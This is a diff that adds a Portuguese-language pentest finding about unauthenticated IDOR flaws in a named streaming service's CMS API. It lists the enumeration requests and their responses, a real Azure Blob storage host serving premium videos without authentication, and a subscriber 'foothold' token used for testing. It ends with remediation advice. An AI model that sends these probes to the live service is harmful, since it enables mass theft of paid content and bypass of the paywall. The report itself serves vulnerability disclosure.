@@ -1,0 +1,92 @@
+# F-021 BOLA/IDOR não-autenticado — `GET /v1/video/{id}` e `GET /v1/program/{id}` (CMS API)
+
+Alvo: https://cms.soultv.com.br/v1/video/{id}  e  https://cms.soultv.com.br/v1/program/{id}
+Severidade: Alta (amplia F-E02/F-017; bypass de paywall + furto de conteúdo premium)
+Timestamp: 2026-08-27T20:05:00Z
+Descoberto por: webapp (endpoints extraídos do JS bundle pay chunk_3.4)
+
+## Vulnerabilidade
+Dois endpoints adicionais do CMS Django REST Framework expostos **sem autenticação**,
+enumeráveis por ID sequencial, vazam metadados + URLs diretas de download no Azure
+Blob Storage (`stsoultvbrs.blob.core.windows.net/media/channel_videos/*.mp4`):
+- `GET /v1/video/{id}` → dados do vídeo + `url` (Azure Blob, baixável sem auth — ver F-E02)
+- `GET /v1/program/{id}` → dados do programa + `image`/`image_mobile` (Azure Blob)
+
+Estes endpoints são descobertos no JS bundle pay (`chunk_*.js`):
+`.get(video/${id})`, `.get(program/${id})`) — vetores de IDOR além de `/v1/brand/{id}/videos`
+(F-E02) e `/v1/brand/{id}` (F-017).
+
+## Confirmação (read-only, sem auth)
+
+### /v1/video/{id} — IDOR + leak de URL Azure Blob
+```
+GET /v1/video/1       -> 200, 87B  {"data":[{"name":"","duration":"","description":"","preview_img":null}]}  (vazio/id sem vídeo)
+GET /v1/video/1000    -> 200, 1438B "O Barba Azul (1947) | Direção: Charlie C..."  url=stsoultvbrs.../media/channel_videos/...
+GET /v1/video/2000    -> 200, 1484B "24/03/2021 - A Joia da China - Yiwu..."        url=stsoultvbrs...
+GET /v1/video/3000    -> 200, 1594B "03/09/2021 - Pirão e Caviar Com Raul..."       url=stsoultvbrs...
+GET /v1/video/5000    -> 200, 539B  "05/05/2023 - Em casa com Sandra Lima..."      url=stsoultvbrs...
+GET /v1/video/6838    -> 200, 1444B "29/10/2025 | BASTIDORES DA FINAL | PONTE..."   url=stsoultvbrs.../media/channel_videos/video_pontv_03-11.mp4
+GET /v1/video/6900    -> 200, HAS_DATA
+GET /v1/video/6910..15000 -> 200, 87B (EMPTY — fora do range)
+```
+→ IDs 1..~6900 enumeráveis; cada vídeo com `url` apontando para Azure Blob com
+download direto sem auth (HEAD confirmou 593MB baixável em F-E02). Retorna `data`
+como array (`[{"id":6838,"name":"...","url":"https://stsoultvbrs.blob.core.windows.net/media/channel_videos/<file>.mp4","duration":...}]`).
+
+### /v1/program/{id} — IDOR + leak de imagens Azure Blob
+```
+GET /v1/program/1   -> 200, 1112B "Amanpour"     image=stsoultvbrs.../media/programs/Featured-web-min_splPff7.jpg
+GET /v1/program/5   -> 200 "Rede1"
+GET /v1/program/10  -> 200 "PEPEPEP"
+GET /v1/program/50  -> 200 "Programa 1"
+GET /v1/program/100 -> 200 "Expandindo a Consciência"
+GET /v1/program/200 -> 200 "Programa Saúde em Forma"
+GET /v1/program/500 -> 200 "Cinema da Tarde"
+GET /v1/program/1000-> 200 "Teste"
+```
+→ IDs 1..1000+ enumeráveis; vaza nome/descrição/imagens de programas (catálogo).
+
+### /v1/offer/{id} — requer auth (401 sem token), 200 com token de assinante (F-013)
+```
+GET /v1/offer/1 (sem token) -> 401 "Authentication credentials were not provided."
+GET /v1/offer/3 (com Token foothold) -> 200 {"data":{"id":3,"coin":"R$","add_unit":null,"img":"...limpezadepraia.jpg","img_horizontal":...}}
+GET /v1/offer/10(com Token) -> 200 {"img":"...180x300-Mobile_SoulTV-equivalente_v1.png",...}
+```
+→ `/v1/offer/{id}` exige auth (DRF), mas qualquer assinante auto-registrado (F-013)
+acessa ofertas/promoções por ID (IDOR autenticado, severidade média — dados de
+campanha/promoção, não PII).
+
+### /v1/schedules/list?user={id} e /v1/schedules?channel={id} — sem auth
+```
+GET /v1/schedules/list?user=1        -> 200 {"success":true,"data":[]}       (IDOR, vazio)
+GET /v1/schedules/list?user=856436   -> 200 {"success":true,"data":[]}       (meu foothold)
+GET /v1/schedules/list?user=500000   -> 200 {"success":true,"data":[]}
+GET /v1/schedules?channel=1          -> {"detail":"No Brand matches the given query."}
+GET /v1/schedules?channel=5          -> 200 {"data":{"2026-08-27":[],...,"2026-09-02":[]}}  (grade 7 dias, sem auth)
+```
+→ schedules/list?user aceita qualquer user (IDOR, dados de agenda por assinante —
+atualmente vazios); schedules?channel expõe grade de programação por canal sem auth.
+
+## Impacto
+- **Furto de conteúdo premium massivo:** combinado com F-E02 (HEAD do Azure Blob =
+  593MB baixável sem auth), `/v1/video/{id}` enumera ~6900 vídeos premium por ID
+  sequencial sem auth e entrega URL de download direto → catálogo VOD completo
+  baixável sem pagar. Bypass total de paywall.
+- **Catálogo/footprinting:** /v1/program/{id} vaza metadados + imagens; /v1/offer/{id}
+  vaza campanhas/promoções; /v1/schedules?channel expõe grade.
+- **PII indireta:** nomes de programas/vídeos revelam parcerias, conteúdo interno
+  (ex.: "Teste" program id=1000, programas internos de teste em produção).
+
+## Recomendação
+- Exigir autenticação + assinatura ativa em TODOS os endpoints de catálogo/VOD:
+  `/v1/video/{id}`, `/v1/program/{id}`, `/v1/offer/{id}`, `/v1/schedules*`,
+  `/v1/brand/{id}[/videos]` (F-017/F-E02).
+- Nunca expor `url` de Azure Blob direta — usar signed-URL de expiração curta emitida
+  após auth+assinatura; ou AES-128 key por endpoint autenticado; ou DRM.
+- Tornar o Azure Blob container `media` private (C-002/F-E02) — servir só via
+  CDN/SAS temporária.
+- Rate limit + CAPTCHA nos endpoints de enumeração.
+
+## Artefatos
+- enum/webapp/endpoints/ (probes video/program/offer/schedules)
+- Cadeia: F-E02 (brand/{id}/videos + Azure Blob 593MB), F-017 (brand/{id}), C-002
